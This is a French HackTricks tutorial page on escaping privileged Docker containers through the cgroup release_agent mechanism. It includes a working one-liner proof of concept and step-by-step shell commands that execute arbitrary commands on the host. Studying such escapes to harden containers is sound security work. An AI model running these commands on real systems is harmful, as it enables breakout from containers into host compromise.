# Évasion des cgroups Docker release_agent

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


**Pour plus de détails, consultez le [billet de blog original](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).** Ceci n'est qu'un résumé :

PoC original :
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Le proof of concept (PoC) démontre une méthode pour exploiter les cgroups en créant un fichier `release_agent` et en déclenchant son invocation pour exécuter des commandes arbitraires sur l'hôte du conteneur. Voici une ventilation des étapes impliquées :

1. **Préparer l'Environnement :**
- Un répertoire `/tmp/cgrp` est créé pour servir de point de montage pour le cgroup.
- Le contrôleur de cgroup RDMA est monté sur ce répertoire. En cas d'absence du contrôleur RDMA, il est suggéré d'utiliser le contrôleur de cgroup `memory` comme alternative.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Configurer le sous-cgroupe enfant :**
   - Un sous-cgroupe enfant nommé "x" est créé dans le répertoire de cgroup monté.
   - Les notifications sont activées pour le sous-cgroupe "x" en écrivant 1 dans son fichier notify_on_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Configurer l'Agent de Libération :**
- Le chemin du conteneur sur l'hôte est obtenu à partir du fichier /etc/mtab.
- Le fichier release_agent du cgroup est ensuite configuré pour exécuter un script nommé /cmd situé dans le chemin de l'hôte acquis.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Créer et Configurer le Script /cmd :**
- Le script /cmd est créé à l'intérieur du conteneur et est configuré pour exécuter ps aux, redirigeant la sortie vers un fichier nommé /output dans le conteneur. Le chemin complet de /output sur l'hôte est spécifié.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Déclencher l'attaque :**
- Un processus est lancé dans le cgroup enfant "x" et est immédiatement arrêté.
- Cela déclenche le `release_agent` (le script /cmd), qui exécute ps aux sur l'hôte et écrit la sortie dans /output à l'intérieur du conteneur.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert Red Team AWS de HackTricks)</strong></a><strong>!</strong></summary>

D'autres façons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
